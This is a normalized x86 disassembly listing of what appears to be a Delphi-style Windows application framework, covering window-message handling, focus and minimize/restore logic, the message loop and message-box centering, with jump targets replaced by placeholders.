mov eax [ rw-data ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
pop ecx
pop edx
pop esi
pop ebx
retn
cmp [ ebx + 0x94 ] 0x0
jne r-xdata
inc [ ebx + 0x94 ]
mov eax [ ebx + 0x30 ]
mov [ esp ] eax
mov [ esp + 0x4 ] dl
mov eax esp
push eax
push sub_4521c0
call EnumWindows
mov eax [ ebx + 0x90 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
push 0x3
mov eax [ esp + 0x4 ]
push eax
call GetWindow
mov esi eax
mov [ esp ] esi
push 0xffffffec
push esi
call GetWindowLongA
test al 0x8
je r-xdata
mov eax [ ebx + 0x90 ]
mov esi [ eax + 0x8 ]
dec esi
cmp esi 0x0
jl r-xdata
mov [ esp ] 0xfffffffe
push 0x213
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ esp + 0x14 ]
push eax
mov edx esi
mov eax [ ebx + 0x90 ]
call sub_413860
push eax
call SetWindowPos
dec esi
cmp esi 0xffffffff
jne r-xdata
sub_452348
push ebx
push esi
mov ebx eax
mov eax [ rw-data ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x94 ] 0x0
jle r-xdata
dec [ ebx + 0x94 ]
cmp [ ebx + 0x94 ] 0x0
jne r-xdata
mov eax [ ebx + 0x90 ]
mov esi [ eax + 0x8 ]
dec esi
cmp esi 0x0
jl r-xdata
mov eax [ ebx + 0x90 ]
mov edx [ eax ]
call [ edx + 0x8 ]
push 0x213
push 0x0
push 0x0
push 0x0
push 0x0
push 0xffffffff
mov edx esi
mov eax [ ebx + 0x90 ]
call sub_413860
push eax
call SetWindowPos
dec esi
cmp esi 0xffffffff
jne r-xdata
sub_4523e4
push ebx
push esi
push edi
mov edi edx
mov esi eax
xor ebx ebx
mov eax [ edi ]
cmp eax [ rw-data ]
je r-xdata
cmp [ esi + 0x59 ] 0x0
je r-xdata
cmp eax 0x1a
jne r-xdata
cmp [ esi + 0x5a ] 0x0
je r-xdata
push 0x400
call SetThreadLocale
call sub_40c238
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov eax [ edi ]
cmp eax [ rw-data ]
jne r-xdata
mov eax [ rw-data ]
call sub_4513a0
mov eax [ rw-data ]
call sub_4519e8
sub_45243c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_452499
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x13a ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4524a0
lea eax [ ebp - 0x4 ]
call sub_403eac
retn
lea eax [ ebp - 0x4 ]
mov edx [ esi + 0x8 ]
call sub_4040a4
mov eax [ ebp - 0x4 ]
push eax
lea eax [ esi + 0xc ]
push eax
mov ecx [ esi + 0x4 ]
mov edx ebx
mov eax [ ebx + 0x13c ]
call [ ebx + 0x138 ]
sub_4524a8
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call DefWindowProcA
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov [ edx + 0xc ] eax
pop ebp
retn
sub_4524e4
push ebp
mov ebp esp
add esp 0xffffffc0
push ebx
lea eax [ ebp - 0x40 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call BeginPaint
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_452c34
push eax
push 0x0
push 0x0
push ebx
call DrawIcon
lea eax [ ebp - 0x40 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call EndPaint
pop ebx
mov esp ebp
pop ebp
retn
sub_452530
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor edx edx
push ebp
push sub_452bea
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x8 ]
xor edx edx
mov [ eax + 0xc ] edx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xa8 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_4523e4
mov ebx [ ebp - 0x8 ]
mov ebx [ ebx ]
mov eax ebx
cmp eax 0x53
jg r-xdata
inc ebx
xor esi esi
cmp eax 0xb017
jg r-xdata
je r-xdata
inc esi
dec ebx
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
cmp eax 0xb020
jg r-xdata
je r-xdata
mov ecx [ ebp - 0x8 ]
mov ecx [ ecx + 0x8 ]
mov edx [ ebp - 0x8 ]
mov dx [ edx + 0x4 ]
mov eax [ ebp - 0x4 ]
call sub_453650
jmp r-xdata
cmp eax 0x16
jg r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xa8 ]
mov edx esi
call sub_413860
mov edi eax
mov edx [ ebp - 0x8 ]
mov eax [ edi + 0x4 ]
call [ edi ]
test al al
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub eax 0xb031
je r-xdata
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x44 ]
test eax eax
je r-xdata
cmp eax 0xb000
jg r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
cmp eax 0x1d
jg r-xdata
je r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x1
jne r-xdata
add eax 0xfffffff2
sub eax 0x2
jb r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x0
jne r-xdata
sub eax 0xb01a
je r-xdata
mov esi eax
mov eax esi
call sub_43a170
test eax eax
je r-xdata
sub eax 0xb001
je r-xdata
je r-xdata
sub eax 0x37
je r-xdata
je r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
cmp eax 0x14
ja r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0xb0 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xb0 ]
mov edx [ ebp - 0x8 ]
mov [ edx + 0xc ] eax
jmp r-xdata
mov ecx [ ebp - 0x8 ]
mov ecx [ ecx + 0x8 ]
mov eax [ ebp - 0x8 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_4545cc
and eax 0x7f
mov edx [ ebp - 0x8 ]
mov [ edx + 0xc ] eax
jmp r-xdata
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
mov eax [ ebp - 0x4 ]
call sub_45316c
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
mov eax [ ebp - 0x4 ]
call sub_453110
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call IsIconic
test eax eax
jne r-xdata
sub eax 0x5
je r-xdata
mov eax esi
call sub_43a170
push eax
call IsWindowEnabled
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x10a ] 0x0
je r-xdata
sub eax 0x15
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x112 ] 0x0
je r-xdata
sub eax 0x112
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_452c34
mov edx [ ebp - 0x8 ]
mov [ edx + 0xc ] eax
jmp r-xdata
sub eax 0x13
je r-xdata
mov eax [ rw-data ]
call sub_4519e8
push ebp
call sub_4524a8
pop ecx
jmp r-xdata
sub eax 0x1a
je r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x9c ] 0x1
jmp r-xdata
push ebp
call sub_4524a8
pop ecx
jmp [ eax * 4 + jump_table_4525d4 ]
call GetFocus
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x30 ]
jne r-xdata
jmp r-xdata
mov eax esi
call sub_43a170
push eax
call IsWindowVisible
test eax eax
je r-xdata
mov ebx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x10c ]
call [ ebx + 0x108 ]
jmp r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_452fe8
test al al
je r-xdata
jmp r-xdata
mov ebx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x114 ]
call [ ebx + 0x110 ]
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
and eax 0xfff0
sub eax 0xf020
je r-xdata
add eax 0xffffffe0
sub eax 0x7
jb r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
cmp [ eax ] 0xde534454
jne r-xdata
jmp r-xdata
mov edx [ ebp - 0x8 ]
mov edx [ edx + 0x4 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_43e980
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_45243c
push ebp
call sub_4524a8
pop ecx
jmp r-xdata
sub eax 0x2
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x44 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call IsIconic
test eax eax
je r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax ] 0x27
push ebp
call sub_4524a8
pop ecx
jmp r-xdata
push 0x0
push 0x0
push 0xb01a
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call PostMessageA
push ebp
call sub_4524a8
pop ecx
jmp r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
xor eax eax
call sub_419488
jmp r-xdata
xor eax eax
call sub_44a360
test eax eax
je r-xdata
mov [ rw-data ] 0x0
call GetFocus
mov ebx eax
mov eax esi
call sub_43a170
push eax
call SetFocus
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
push eax
mov ecx [ ebp - 0x8 ]
mov ecx [ ecx + 0x4 ]
mov edx 0x112
mov eax esi
call sub_434b3c
push ebx
call SetFocus
mov [ rw-data ] 0x1
mov eax [ ebp - 0x8 ]
mov [ eax + 0xc ] 0x1
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax + 0xc ] 0x1
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_452c50
jmp r-xdata
sub eax 0x100
je r-xdata
mov esi [ ebp - 0x8 ]
mov esi [ esi + 0x8 ]
push esi
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
add ebx 0xbc00
push ebx
mov eax [ ebp - 0x8 ]
push esi
call SendMessageA
mov edx [ ebp - 0x8 ]
mov [ edx + 0xc ] eax
jmp r-xdata
sub eax 0x1e1
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x9e ] 0x0
je r-xdata
push ebp
call sub_4524a8
pop ecx
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x1
sbb eax eax
inc eax
mov edx [ ebp - 0x4 ]
mov [ edx + 0x9d ] al
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
jmp r-xdata
call sub_44fbe8
jmp r-xdata
push ebp
call sub_4524a8
pop ecx
jmp r-xdata
push ebp
call sub_4524e4
pop ecx
jmp r-xdata
push ebp
call sub_4524a8
pop ecx
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xac ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_452348
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xac ]
test eax eax
je r-xdata
push eax
call SetFocus
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_452d00
jmp r-xdata
jmp r-xdata
call sub_428284
call sub_428364
test al al
je r-xdata
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xa0 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_452338
push 0x0
push 0x0
push 0xb001
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call PostMessageA
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_452348
push 0x0
push 0x0
push 0xb000
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call PostMessageA
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_452340
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_44a210
mov edx [ ebp - 0x4 ]
mov [ edx + 0xac ] eax
push ebp
call sub_4524a8
pop ecx
jmp r-xdata
call sub_44a2c4
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0xac ] edx
push ebp
call sub_4524a8
pop ecx
jmp r-xdata
call sub_428284
call sub_4283c0
jmp r-xdata
mov eax [ ebp - 0x8 ]
xor edx edx
mov [ eax + 0xc ] edx
jmp r-xdata
mov edx 0x8000
mov eax r-xdata
call sub_40cbe0
mov ebx eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0xa0 ] ebx
test ebx ebx
je r-xdata
call GetLastError
mov edx [ ebp - 0x8 ]
mov [ edx + 0xc ] eax
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0xa0 ] edx
jmp r-xdata
mov eax [ ebp - 0x8 ]
xor edx edx
mov [ eax + 0xc ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xa0 ]
push eax
call GetProcAddress
mov esi eax
mov ebx esi
test esi esi
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
mov edx [ eax + 0x8 ]
push edx
mov edx [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
push eax
call ebx
jmp r-xdata
sub_452c50
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x30 ]
push eax
call IsIconic
test eax eax
jne r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_452338
mov eax [ ebx + 0x30 ]
push eax
call SetActiveWindow
cmp [ ebx + 0x44 ] 0x0
je r-xdata
mov edx 0x6
mov eax [ ebx + 0x30 ]
call sub_451c68
cmp [ ebx + 0x5b ] 0x0
jne r-xdata
mov edx ebx
mov eax [ ebx + 0x11c ]
call [ ebx + 0x118 ]
mov eax [ ebx + 0x44 ]
call sub_43a170
push eax
call IsWindowEnabled
test eax eax
je r-xdata
mov eax [ ebx + 0x44 ]
cmp [ eax + 0x57 ] 0x0
je r-xdata
push 0x40
push 0x0
mov esi [ ebx + 0x44 ]
mov eax [ esi + 0x48 ]
push eax
mov eax [ esi + 0x44 ]
push eax
mov eax [ esi + 0x40 ]
push eax
mov eax [ ebx + 0x44 ]
call sub_43a170
push eax
mov eax [ ebx + 0x30 ]
push eax
call SetWindowPos
push 0x0
push 0xf020
push 0x112
mov eax [ ebx + 0x30 ]
push eax
call DefWindowProcA
jmp r-xdata
cmp [ ebx + 0x11a ] 0x0
je r-xdata
sub_452d00
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x30 ]
push eax
call IsIconic
test eax eax
je r-xdata
pop esi
pop ebx
retn
mov eax [ ebx + 0x30 ]
push eax
call SetActiveWindow
cmp [ ebx + 0x44 ] 0x0
je r-xdata
mov edx 0x9
mov eax [ ebx + 0x30 ]
call sub_451c68
cmp [ ebx + 0x5b ] 0x0
jne r-xdata
push eax
push 0x0
mov eax [ rw-data ]
mov eax [ eax ]
call eax
sar eax 0x1
jns r-xdata
adc eax 0x0
mov eax [ ebx + 0x44 ]
call sub_43a170
push eax
call IsWindowEnabled
test eax eax
je r-xdata
mov eax [ ebx + 0x44 ]
cmp [ eax + 0x57 ] 0x0
je r-xdata
push eax
push 0x0
mov eax [ ebx + 0x30 ]
push eax
call SetWindowPos
mov eax [ ebx + 0x44 ]
test eax eax
je r-xdata
adc eax 0x0
push 0x0
push 0xf120
push 0x112
mov eax [ ebx + 0x30 ]
push eax
call DefWindowProcA
jmp r-xdata
mov eax ebx
call sub_452348
mov eax [ rw-data ]
mov esi [ eax + 0x64 ]
test esi esi
je r-xdata
cmp [ eax + 0x22b ] 0x1
jne r-xdata
push 0x40
push 0x0
push 0x0
push 0x1
mov eax [ rw-data ]
mov eax [ eax ]
call eax
sar eax 0x1
jns r-xdata
cmp [ ebx + 0x122 ] 0x0
je r-xdata
mov eax esi
call sub_43a170
push eax
call SetFocus
cmp [ eax + 0x57 ] 0x0
jne r-xdata
mov edx ebx
mov eax [ ebx + 0x124 ]
call [ ebx + 0x120 ]
xor edx edx
call sub_44d974
mov eax [ ebx + 0x44 ]
call sub_44fd90
sub_452e00
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
pop esi
pop ebx
retn
push eax
call GetLastActivePopup
mov esi eax
test esi esi
je r-xdata
cmp esi [ ebx + 0x30 ]
je r-xdata
push esi
call IsWindowVisible
test eax eax
je r-xdata
push esi
call IsWindowEnabled
test eax eax
je r-xdata
push esi
call SetForegroundWindow
sub_452e3c
push ebx
push esi
add esp 0xffffff00
mov esi edx
mov ebx eax
cmp [ ebx + 0xa4 ] 0x0
je r-xdata
mov eax esi
mov edx [ ebx + 0x8c ]
call sub_403f00
push 0x100
lea eax [ esp + 0x4 ]
push eax
mov eax [ ebx + 0x30 ]
push eax
call GetWindowTextA
mov ecx eax
mov edx esp
mov eax esi
call sub_403f9c
jmp r-xdata
add esp 0x100
pop esi
pop ebx
retn
sub_452e88
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor eax eax
mov esi [ ebx + 0xb0 ]
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
push edi
push esi
call IsDialogMessageA
cmp eax 0x1
sbb eax eax
inc eax
sub_452eac
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor eax eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
cmp [ esi + 0x22f ] 0x2
jne r-xdata
mov edx [ rw-data ]
cmp [ edx + 0x6c ] 0x0
je r-xdata
mov edx [ rw-data ]
mov edx [ edx + 0x6c ]
cmp [ edx + 0x22f ] 0x1
jne r-xdata
push edi
mov eax [ esi + 0x254 ]
push eax
call TranslateMDISysAccel
cmp eax 0x1
sbb eax eax
inc eax
sub_452efc
push ebx
push esi
push edi
push ebp
mov esi edx
mov edi eax
xor ebx ebx
mov eax [ esi + 0x4 ]
cmp eax 0x100
jb r-xdata
mov eax ebx
pop ebp
pop edi
pop esi
pop ebx
retn
cmp eax 0x108
ja r-xdata
call GetCapture
mov ebp eax
test ebp ebp
jne r-xdata
push 0xfffffffa
push ebp
call GetWindowLongA
cmp eax [ rw-data ]
jne r-xdata
mov ebp [ esi ]
mov eax [ edi + 0x44 ]
test eax eax
je r-xdata
mov eax [ esi + 0xc ]
push eax
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
add eax 0xbc00
push eax
push ebp
call SendMessageA
test eax eax
je r-xdata
mov eax ebp
call sub_430850
test eax eax
jne r-xdata
cmp ebp [ eax + 0x254 ]
jne r-xdata
mov bl 0x1
test ebp ebp
jne r-xdata
test ebp ebp
jne r-xdata
call sub_43a170
mov ebp eax
jmp r-xdata
mov eax [ esi + 0xc ]
push eax
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
add eax 0xbc00
push eax
push ebp
call SendMessageA
test eax eax
je r-xdata
mov ebp [ esi ]
push ebp
call GetParent
mov ebp eax
mov bl 0x1
jmp r-xdata
sub_452fb4
push ebx
push esi
push edi
push ebp
mov edi edx
mov ebp eax
xor ebx ebx
mov esi [ ebp + 0x84 ]
test esi esi
je r-xdata
mov eax ebx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx edi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0xdc ]
test al al
je r-xdata
mov eax ebp
call sub_453f14
sub_452fe8
push ebx
push esi
push edi
push ebp
push ecx
mov ebp edx
mov ebx eax
mov [ esp ] 0x0
cmp [ ebx + 0x12a ] 0x0
je r-xdata
cmp [ esp ] 0x0
jne r-xdata
mov ecx esp
mov edx ebp
mov eax [ ebx + 0x12c ]
call [ ebx + 0x128 ]
mov al 0x1
mov edi [ ebx + 0x44 ]
test edi edi
je r-xdata
xor eax eax
jmp r-xdata
mov eax edi
call sub_43a170
push eax
call IsWindowEnabled
test eax eax
je r-xdata
mov [ esp ] al
mov al [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx ebp
mov eax [ ebx + 0x44 ]
mov si 0xffab
call sub_4032ec
test al al
jne r-xdata
sub_453054
push ebx
push esi
push edi
push ecx
mov edi edx
mov esi eax
xor ebx ebx
push 0x1
push 0x0
push 0x0
push 0x0
push edi
call PeekMessageA
test eax eax
je r-xdata
mov eax ebx
pop edx
pop edi
pop esi
pop ebx
retn
mov bl 0x1
cmp [ edi + 0x4 ] 0x12
je r-xdata
mov [ esi + 0x9c ] 0x1
mov [ esp ] 0x0
cmp [ esi + 0xda ] 0x0
je r-xdata
mov edx edi
mov eax esi
call sub_452fb4
test al al
jne r-xdata
mov ecx esp
mov edx edi
mov eax [ esi + 0xdc ]
call [ esi + 0xd8 ]
cmp [ esp ] 0x0
jne r-xdata
mov edx edi
mov eax esi
call sub_452eac
test al al
jne r-xdata
mov edx edi
mov eax esi
call sub_452efc
test al al
jne r-xdata
mov edx edi
mov eax esi
call sub_452e88
test al al
jne r-xdata
push edi
call TranslateMessage
push edi
call DispatchMessageA
jmp r-xdata
sub_4530ec
push ebx
add esp 0xffffffe4
mov ebx eax
mov edx esp
mov eax ebx
call sub_453054
test al al
jne r-xdata
add esp 0x1c
pop ebx
retn
mov edx esp
mov eax ebx
call sub_4539bc
sub_453110
push ebp
mov ebp esp
push ebx
mov ebx eax
cmp [ ebx + 0xa4 ] 0x0
jne r-xdata
mov eax [ ebx + 0xa8 ]
call sub_413840
mov eax 0x8
call sub_4026cc
mov edx [ ebp + 0x8 ]
mov [ eax ] edx
mov edx [ ebp + 0xc ]
mov [ eax + 0x4 ] edx
mov edx eax
mov eax [ ebx + 0xa8 ]
call sub_413704
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
pop ebx
pop ebp
retn 0x8
lea edx [ ebp + 0x8 ]
push edx
push 0x0
push 0xb020
push eax
call SendMessageA
jmp r-xdata
sub_45316c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx eax
cmp [ ebx + 0xa4 ] 0x0
jne r-xdata
mov eax [ ebx + 0xa8 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
inc edi
xor esi esi
lea edx [ ebp + 0x8 ]
push edx
push 0x1
push 0xb020
push eax
call SendMessageA
jmp r-xdata
inc esi
dec edi
jne r-xdata
mov edx [ ebp + 0xc ]
cmp edx [ eax + 0x4 ]
jne r-xdata
mov edx esi
mov eax [ ebx + 0xa8 ]
call sub_413860
mov edx [ eax ]
cmp edx [ ebp + 0x8 ]
jne r-xdata
mov edx 0x8
call sub_4026ec
mov edx esi
mov eax [ ebx + 0xa8 ]
call sub_413750
jmp r-xdata
sub_453200
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov esi eax
mov eax ebx
call [ eax - 0xc ]
mov ebx eax
mov eax [ ebp - 0x4 ]
mov [ eax ] ebx
xor eax eax
push ebp
push j_sub_403578#5
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx esi
or edx 0xffffffff
mov eax ebx
mov edi [ eax ]
call [ edi + 0x2c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
cmp [ esi + 0x44 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax ebx
mov edx [ r-xdata ]
call sub_40327c
test al al
je r-xdata
mov edi ebx
mov eax edi
call sub_43a14c
mov [ esi + 0x44 ] edi
sub_453280
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0xa5 ] 0x1
xor edx edx
push ebp
push sub_45335e
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax sub_44a188
call sub_40795c
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x44 ]
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_453365
mov eax [ ebp - 0x4 ]
mov [ eax + 0xa5 ] 0x0
retn
mov edx [ rw-data ]
mov edx [ edx ]
sub edx 0x3
je r-xdata
mov dl 0x2
call sub_44d974
sub edx 0x4
jne r-xdata
xor eax eax
push ebp
push sub_453325
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_4530ec
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x44 ]
cmp [ eax + 0x22b ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x5b ] 0x0
je r-xdata
mov [ eax + 0x22b ] 0x1
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x9c ] 0x0
je r-xdata
mov dl 0x1
call sub_44c87c
mov eax [ ebp - 0x4 ]
call sub_452c50
jmp r-xdata
sub_453380
push ebx
push esi
mov esi edx
mov ebx eax
call GetCapture
test eax eax
je r-xdata
call sub_40275c
mov edx [ r-xdata ]
call sub_40327c
test al al
je r-xdata
push 0x0
push 0x0
push 0x1f
call GetCapture
push eax
call SendMessageA
call sub_40277c
push eax
call sub_40275c
pop edx
call sub_40b0f8
call sub_40275c
mov edx [ rw-data ]
call sub_40327c
test al al
jne r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0xd2 ] 0x0
je r-xdata
call sub_40275c
mov edx eax
mov eax ebx
call sub_453578
pop esi
pop ebx
retn
call sub_40275c
mov ecx eax
mov edx esi
mov eax [ ebx + 0xd4 ]
call [ ebx + 0xd0 ]
jmp r-xdata
sub_453410
push ebp
mov ebp esp
add esp 0xffffffac
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov [ ebp - 0x4 ] eax
mov ebx [ ebp + 0x8 ]
call GetActiveWindow
mov [ ebp - 0xc ] eax
push 0x2
mov eax [ ebp - 0xc ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov [ ebp - 0x14 ] eax
push 0x2
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x14 ]
cmp eax [ ebp - 0x18 ]
je r-xdata
xor eax eax
call sub_44a210
mov [ ebp - 0x10 ] eax
call sub_44a12c
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x4 ]
call sub_4523b4
test al al
je r-xdata
mov [ ebp - 0x44 ] 0x28
lea eax [ ebp - 0x44 ]
push eax
mov eax [ ebp - 0x14 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
lea eax [ ebp - 0x54 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call GetWindowRect
push 0x1d
push 0x0
push 0x0
mov ecx [ ebp - 0x34 ]
mov edx [ ebp - 0x3c ]
sub ecx edx
sar ecx 0x1
jns r-xdata
xor ecx ecx
push ebp
push sub_453565
push [ fs : ecx ]
mov [ fs : ecx ] esp
push ebx
push edi
push esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call MessageBoxA
mov [ ebp - 0x8 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45356c
mov eax [ ebp - 0x14 ]
cmp eax [ ebp - 0x18 ]
je r-xdata
or ebx 0x100000
add ecx edx
push ecx
mov edx [ ebp - 0x38 ]
mov eax [ ebp - 0x40 ]
sub edx eax
sar edx 0x1
jns r-xdata
adc ecx 0x0
mov eax [ ebp - 0x10 ]
call sub_44a2c4
mov eax [ ebp - 0xc ]
push eax
call SetActiveWindow
mov eax [ ebp - 0x1c ]
call sub_44a134
retn
push 0x1d
push 0x0
push 0x0
mov ecx [ ebp - 0x48 ]
mov edx [ ebp - 0x50 ]
sub ecx edx
sar ecx 0x1
jns r-xdata
add edx eax
push edx
push 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call SetWindowPos
adc edx 0x0
add ecx edx
push ecx
mov edx [ ebp - 0x4c ]
mov eax [ ebp - 0x54 ]
sub edx eax
sar edx 0x1
jns r-xdata
adc ecx 0x0
add edx eax
push edx
push 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call SetWindowPos
adc edx 0x0
sub_453578
push ebp
mov ebp esp
add esp 0xfffffef8
push ebx
push esi
xor ecx ecx
